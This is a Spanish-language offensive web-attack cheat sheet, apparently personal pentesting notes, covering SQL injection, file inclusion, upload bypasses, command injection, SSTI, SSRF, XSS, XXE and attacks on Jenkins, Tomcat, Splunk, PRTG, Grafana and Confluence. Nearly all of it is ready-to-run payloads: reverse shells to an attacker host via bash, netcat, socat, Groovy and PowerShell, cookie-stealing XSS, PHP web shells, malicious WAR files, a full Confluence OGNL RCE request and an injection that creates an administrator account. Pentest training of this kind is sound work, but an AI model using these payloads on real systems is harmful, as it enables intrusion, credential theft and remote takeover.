# 🌐 02 — Web Attacks

> → Enlace: `[[00_METODOLOGIA_GENERAL]]` | `[[01_Footprinting]]`

---

## 2.1 — Fingerprinting web (siempre primero)

```bash
# Stack tecnológico
whatweb http://<IP>
# Wappalyzer (extensión browser)

# Rutas estándar
curl http://<IP>/robots.txt
curl http://<IP>/sitemap.xml
curl http://<IP>/.well-known/

# Ver código fuente — buscar:
# Comentarios con rutas o credenciales
# Parámetros ocultos en formularios
# Versiones de frameworks/CMS
```

---

## 2.2 — Fuzzing de directorios y archivos

```bash
# Directory brute-force inicial
ffuf -u http://<IP>/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,301,302,403 -v

# Wordlist más grande si la anterior da poco
ffuf -u http://<IP>/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -mc 200,301,302,403

# Extensiones en rutas encontradas
ffuf -u http://<IP>/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
  -e .php,.bak,.txt,.html,.conf,.zip,.old,.sql,.xml

# Fuzzing de parámetros GET
ffuf -u "http://<IP>/page.php?FUZZ=test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs <tamaño_respuesta_normal>

# Fuzzing de vhosts / subdominios
ffuf -u http://<IP> \
  -H "Host: FUZZ.<domain>" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fw <baseline_words>
```

> **→ Si encuentras /admin, /backup, /config, /upload, /api:** son prioridad. **→ Si hay 403:** probar bypass de directorio (ver sección 2.3).

---

## 2.3 — Bypass de 403

```bash
# Headers de bypass
curl -H "X-Original-URL: /admin" http://<IP>/
curl -H "X-Rewrite-URL: /admin" http://<IP>/
curl -H "X-Forwarded-For: 127.0.0.1" http://<IP>/admin
curl -H "X-Custom-IP-Authorization: 127.0.0.1" http://<IP>/admin

# Path fuzzing
curl http://<IP>/admin/
curl http://<IP>//admin/
curl http://<IP>/./admin/
curl http://<IP>/Admin
curl http://<IP>/ADMIN
```

---

## 2.4 — CMS detectado

### WordPress

```bash
wpscan --url http://<IP> -e u,p,t
wpscan --url http://<IP> -U users.txt -P /usr/share/wordlists/rockyou.txt
# Rutas clave: /wp-login.php, /wp-admin/, /xmlrpc.php
# Credenciales por defecto: admin/admin
```

### Drupal

```bash
droopescan scan drupal -u http://<IP>
# Rutas clave: /user/login, /admin, /CHANGELOG.txt (revela versión)
```

### Joomla

```bash
joomscan -u http://<IP>
# Rutas clave: /administrator, /configuration.php
```

### Tomcat

```bash
# Ruta clave: /manager/html
# Credenciales por defecto: tomcat/tomcat, admin/admin, manager/manager
# Si accedes al manager → subir WAR malicioso = RCE
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=443 -f war -o shell.war
```

---

## 2.5 — SQL Injection

### Detección

```
# En cualquier parámetro: GET, POST, cookies, headers
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
" OR 1=1--
```

### SQLMap

```bash
# GET parameter
sqlmap -u "http://<IP>/page.php?id=1" --batch --dbs

# POST parameter
sqlmap -u "http://<IP>/login" --data="user=admin&pass=test" --batch --dbs

# Con cookie de sesión
sqlmap -u "http://<IP>/page.php?id=1" --cookie="PHPSESSID=abc123" --batch --dbs

# Extraer datos
sqlmap -u "http://<IP>/page.php?id=1" --batch -D <db> --tables
sqlmap -u "http://<IP>/page.php?id=1" --batch -D <db> -T <table> --dump

# Intentar OS shell (si el usuario tiene FILE privilege)
sqlmap -u "http://<IP>/page.php?id=1" --batch --os-shell
```

### SQLi manual — UNION based

```sql
-- Detectar número de columnas
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  ← cuando da error, son n-1 columnas

-- Encontrar columnas visibles
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--

-- Extraer datos
' UNION SELECT 1,username,password FROM users--
' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='<db>'--

-- Leer archivos (MySQL)
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--

-- Escribir archivo (si tiene permisos)
' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3 INTO OUTFILE '/var/www/html/shell.php'--
```

---

## 2.6 — Local File Inclusion (LFI)

### Detección

```
# Parámetros típicos: ?page=, ?file=, ?include=, ?path=, ?view=
http://<IP>/index.php?page=about
```

### Payloads básicos

```
# Linux
?page=../../../../etc/passwd
?page=../../../../etc/shadow
?page=../../../../etc/hosts

# Windows
?page=../../../../windows/system32/drivers/etc/hosts
?page=../../../../windows/win.ini

# Path traversal encoding
?page=....//....//etc/passwd
?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd
?page=..%252f..%252fetc%252fpasswd
```

### LFI → RCE (Log Poisoning)

```bash
# 1. Envenenar el log de Apache/SSH
curl -s "http://<IP>/index.php" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
# o
ssh '<?php system($_GET["cmd"]); ?>'@<IP>

# 2. Incluir el log
?page=../../../../var/log/apache2/access.log&cmd=id
?page=../../../../var/log/auth.log&cmd=id

# Logs comunes:
# /var/log/apache2/access.log
# /var/log/nginx/access.log
# /var/log/auth.log
# /proc/self/environ
```

### LFI con wrappers PHP

```
# Ver código fuente de un PHP
?page=php://filter/convert.base64-encode/resource=index.php

# RCE con data://
?page=data://text/plain,<?php system($_GET['cmd']); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

### Remote File Inclusion (RFI)

```bash
# Primero verificar si está habilitado allow_url_include
?page=http://<attacker>/shell.php

# Shell en attacker
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80
```

---

## 2.7 — File Upload

### Checklist de bypass

- [ ] ¿Valida solo la extensión? → Subir `.php5`, `.phtml`, `.phar`, `.shtml`
- [ ] ¿Valida el Content-Type? → Cambiar en Burp a `image/jpeg`
- [ ] ¿Valida magic bytes? → Añadir `GIF89a;` al inicio del payload PHP
- [ ] ¿Doble extensión? → `shell.php.jpg`, `shell.jpg.php`
- [ ] ¿Null byte? → `shell.php%00.jpg`
- [ ] ¿Blacklist? → Probar `.php3`, `.php4`, `.php7`, `.pHp`, `.PhP`
- [ ] ¿Hay .htaccess subible? → Subir `.htaccess` con `AddType application/x-httpd-php .jpg`

### Payload web shell

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
```

### Reverse shell desde web shell

```bash
# URL-encode este comando en el parámetro cmd
bash -c 'bash -i >& /dev/tcp/<attacker_IP>/443 0>&1'
# o
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_IP> 443 >/tmp/f
```

---

## 2.8 — Command Injection

### Detección

```
# En campos que parecen ejecutar comandos del sistema:
# ping, lookup, traceroute, name resolution, file conversion...
test; id
test && id
test | id
test || id
`id`
$(id)
```

### Bypass de filtros

```bash
# Espacios bloqueados
{id}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# Caracteres bloqueados — encoding
$(printf '\x63\x61\x74') /etc/passwd   # cat en hex
```

### Reverse shell desde command injection

```bash
# Listener en attacker
nc -lvnp 443

# Payload
bash -c 'bash -i >& /dev/tcp/<attacker_IP>/443 0>&1'
```

---

## 2.9 — Server-Side Template Injection (SSTI)

### Detección

```
# En campos que renderiza la aplicación (nombres, mensajes, búsquedas)
{{7*7}}          → si devuelve 49 → SSTI
${7*7}           → Freemarker / Velocity
<%= 7*7 %>       → ERB (Ruby)
#{7*7}           → Ruby
*{7*7}           → Spring (Thymeleaf)
```

### Identificar motor y RCE

```
# Jinja2 (Python/Flask)
{{config}}
{{7*'7'}}        → 7777777 = Jinja2
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
${"freemarker.template.utility.Execute"?new()("id")}
```

---

## 2.10 — Server-Side Request Forgery (SSRF)

### Detección

```
# Parámetros que hacen peticiones a URLs externas:
?url=, ?path=, ?src=, ?dest=, ?redirect=, ?uri=, ?load=
```

### Payloads

```
# Acceso a servicios internos
?url=http://127.0.0.1/admin
?url=http://localhost:8080
?url=http://192.168.1.1

# Metadata cloud
?url=http://169.254.169.254/latest/meta-data/            # AWS
?url=http://metadata.google.internal/computeMetadata/v1/ # GCP

# File access
?url=file:///etc/passwd

# Bypass de filtros
?url=http://127.1/admin
?url=http://0x7f000001/admin
?url=http://017700000001/admin
?url=http://[::1]/admin
```

---

## 2.11 — XSS (Cross-Site Scripting)

```html
<!-- Detección -->
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Robo de cookies (stored XSS) -->
<script>document.location='http://<attacker>/c?c='+document.cookie</script>
<script>new Image().src='http://<attacker>/c?c='+document.cookie</script>

<!-- Listener en attacker -->
python3 -m http.server 80
```

---

## 2.12 — XXE (XML External Entity)

```xml
<!-- En cualquier input XML (uploads, SOAP, REST con XML) -->

<!-- Basic XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

<!-- XXE SSRF -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]>
<data>&xxe;</data>
```

---

## 2.13 — Estabilizar shell

```bash
# Después de conseguir reverse shell:

# Python (más completo)
python3 -c "import pty; pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Script
/usr/bin/script -qc /bin/bash /dev/null

# Netcat upgrade con socat
# En attacker:
socat file:`tty`,raw,echo=0 tcp-listen:443
# En víctima:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker>:443
```

---

## ✅ Checkpoint Web

- [ ] Todas las rutas/endpoints descubiertos con fuzzing
- [ ] Vhosts y subdominios buscados
- [ ] Parámetros probados con SQLi básico
- [ ] CMS identificado y escaneado si aplica
- [ ] Forms/inputs probados con payloads básicos
- [ ] Código fuente revisado
- [ ] Credenciales encontradas anotadas

> **Think dumber:** antes de explotar algo complejo, ¿has probado credenciales por defecto en el panel de admin?

---


---

## 2.14 — Attacking Common Applications

> **Regla:** Siempre probar credenciales por defecto ANTES de buscar exploits. La mayoría de los paneles caen con default creds + funcionalidad legítima de la app.

---

### Jenkins

```bash
# Detección: puerto 8080, título "Dashboard [Jenkins]"
# Default creds: admin/admin, jenkins/jenkins, admin/(vacío)

# RCE via Script Console (si tienes acceso admin)
# → Manage Jenkins → Script Console → Groovy script

# Groovy reverse shell (pegar en Script Console):
String host = "<attacker_IP>";
int port = 443;
String cmd = "/bin/bash";
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s = new Socket(host, port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while (!s.isClosed()) {
    while (pi.available() > 0) so.write(pi.read());
    while (pe.available() > 0) so.write(pe.read());
    while (si.available() > 0) po.write(si.read());
    so.flush(); po.flush();
    Thread.sleep(50);
    try { p.exitValue(); break; } catch (Exception e) {}
}

# RCE via Job (alternativa más simple)
# New Item → Freestyle project → Build → Execute shell
bash -c 'bash -i >& /dev/tcp/<attacker_IP>/443 0>&1'

# Windows reverse shell desde Jenkins
# Build → Execute Windows batch command:
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

### GitLab / Gitea / Gogs

```bash
# Detección: título "GitLab", puerto 80/443/3000
# Default creds:
#   GitLab  → root / 5iveL!fe (versiones antiguas) o fuerza cambio en instalación nueva
#   Gitea   → admin / admin
#   Gogs    → admin / admin

# Enumerar repos públicos sin creds
curl http://<IP>/explore/repos
curl http://<IP>/api/v1/repos/search     # Gitea/Gogs API
curl http://<IP>/api/v4/projects         # GitLab API

# Buscar credenciales en repos (siempre revisar)
# → Commits antiguos, branches, archivos de config
# → Grep por: .env, config.php, database.yml, settings.py, appsettings.json, id_rsa

# CVE-2021-22205 GitLab RCE (< 13.10.3) — ExifTool RCE sin autenticación
# Verificar versión en /help o /-/help
curl http://<IP>/help | grep "GitLab"
python3 CVE-2021-22205.py http://<IP> "<attacker_IP>" <port>
```

---

### Splunk

```bash
# Detección: puerto 8000 (web UI), 8089 (API/forwarder)
# Default creds: admin/changeme

# RCE via Splunk Universal Forwarder (puerto 8089 con acceso admin)
python3 PySplunkWhisperer2_remote.py \
  --host <IP> --port 8089 \
  --username admin --password changeme \
  --payload "bash -c 'bash -i >& /dev/tcp/<attacker>/443 0>&1'"

# RCE via Custom App upload (acceso admin a Splunk Web, puerto 8000)
# Apps → Manage Apps → Install app from file → subir .tar.gz malicioso

# Splunk en Windows — buscar credenciales
type "C:\Program Files\Splunk\etc\passwd"
type "C:\Program Files\SplunkUniversalForwarder\etc\passwd"
```

---

### PRTG Network Monitor

```bash
# Detección: puerto 80/443/8080, título "PRTG Network Monitor"
# Default creds: prtgadmin/prtgadmin

# Buscar contraseñas en configuración antigua (post-explotación Windows)
type "C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old" | findstr /i "dbpassword"
# Las contraseñas del backup suelen tener +1 en el año (ej: P@ssw0rd2019 → probar P@ssw0rd2020)

# CVE-2018-9276 — RCE via notificaciones (PRTG < 18.2.39, autenticado)
# Setup → Account Settings → Notifications → Add new notification
# Trigger condition: Execute Program
# Parameter field: test.txt;net user pentest Password123! /add;net localgroup administrators pentest /add
# Guardar → Ejecutar notificación → usuario creado con permisos de administrador
```

---

### osTicket

```bash
# Detección: panel de soporte, título "osTicket", /scp/login.php
# Default creds: admin/admin

# Enumerar sin creds — crear ticket de soporte
# → Revisar emails de respuesta para obtener información interna
# → Buscar adjuntos que acepte (posible file upload)

# Con acceso admin — buscar credenciales en configuración
# → Admin Panel → Settings → System Settings → DB credentials
# → /bootstrap/conf/ost-config.php (si hay LFI o acceso de ficheros)
```

---

### Tomcat (ampliado)

```bash
# Detección: /manager/html, puerto 8080/8443
# Default creds: tomcat/tomcat, admin/admin, manager/manager, tomcat/s3cret

# Fuzzing para encontrar el manager si no está en la ruta estándar
ffuf -u http://<IP>:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt

# Crear WAR malicioso
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=443 -f war -o shell.war

# Subir WAR via browser (GUI del manager)
# Manager App → Deploy → WAR file to deploy → Browse → shell.war → Deploy
curl http://<IP>:8080/shell/   # ejecutar

# Subir WAR via curl (sin browser)
curl -u 'tomcat:tomcat' "http://<IP>:8080/manager/text/deploy?path=/shell" \
  --upload-file shell.war
curl http://<IP>:8080/shell/

# Buscar credenciales en tomcat-users.xml
# Windows: C:\Program Files\Apache Software Foundation\Tomcat\conf\tomcat-users.xml
# Linux:   /opt/tomcat/conf/tomcat-users.xml
#          /etc/tomcat*/tomcat-users.xml
```

---

### Nagios / Zabbix / Grafana

```bash
# Nagios
# Default creds: nagiosadmin/nagios
# Ruta: /nagios/
# RCE: Nagios XI < 5.8.5 → CVE-2021-25296 (autenticado)

# Zabbix
# Default creds: Admin/zabbix
# RCE via Administration → Scripts → crear script bash
# → Seleccionar host → Execute script → reverse shell

# Grafana
# Default creds: admin/admin (fuerza cambio en v8+)
# CVE-2021-43798 — Path Traversal (< 8.3.0, sin autenticación):
curl --path-as-is http://<IP>:3000/public/plugins/alertlist/../../../etc/passwd
curl --path-as-is http://<IP>:3000/public/plugins/alertlist/../../../etc/grafana/grafana.ini
# grafana.ini contiene secret_key → puede usarse para descifrar datasource passwords
```

---

### Confluence / JIRA

```bash
# Confluence default: admin/admin
# JIRA default: admin/admin

# CVE-2022-26134 Confluence OGNL RCE (sin autenticación, < 7.18.1)
curl -v 'http://<IP>:8090/%24%7B%28%23a%3D%40org.apache.tomcat.InstanceManager%40%40getContext%28%29.getResources%28%29%2C%23b%3D%40org.apache.tomcat.InstanceManager%40%40getContext%28%29.getManager%28%29%2C%23c%3Dnew+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22id%22%7D%29.start%28%29%2C%23d%3D%23c.getInputStream%28%29%2C%23e%3Dnew+java.io.InputStreamReader%28%23d%29%2C%23f%3Dnew+java.io.BufferedReader%28%23e%29%2C%23g%3D%23f.readLine%28%29%2C%23h%3D%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29%2C%23h.getWriter%28%29.println%28%23g%29%7D/'

# Enumerar sin creds
curl http://<IP>/rest/api/2/serverInfo          # JIRA server info
curl http://<IP>/wiki/rest/api/space            # Confluence spaces públicos
curl http://<IP>/wiki/rest/api/content          # Confluence páginas públicas
```

---

### Checklist Common Applications

```
Al encontrar una aplicación desconocida:
1. Identificar nombre y versión (título, footer, /about, headers HTTP, código fuente)
2. Buscar la ruta de admin (ffuf con wordlist específica del CMS)
3. Probar credenciales por defecto (ver tabla en 03_PasswordAttacks)
4. Buscar CVE para esa versión exacta (searchsploit, Google, ExploitDB)
5. Buscar funcionalidad nativa que permita RCE (script console, file upload, plugins)
6. Buscar archivos de configuración expuestos (/backup, /.git, /conf, /config)
7. Revisar código fuente y comentarios HTML
```

---

## ✅ Checkpoint Web

- [ ] Todas las rutas/endpoints descubiertos con fuzzing
- [ ] Vhosts y subdominios buscados
- [ ] Parámetros probados con SQLi básico
- [ ] CMS identificado y escaneado si aplica
- [ ] Aplicaciones comunes identificadas y default creds probadas
- [ ] Forms/inputs probados con payloads básicos
- [ ] Código fuente revisado
- [ ] Credenciales encontradas anotadas

> **Think dumber:** antes de explotar algo complejo, ¿has probado credenciales por defecto en el panel de admin?

---

_→ Siguiente: `[[03_Password_Attacks]]`_
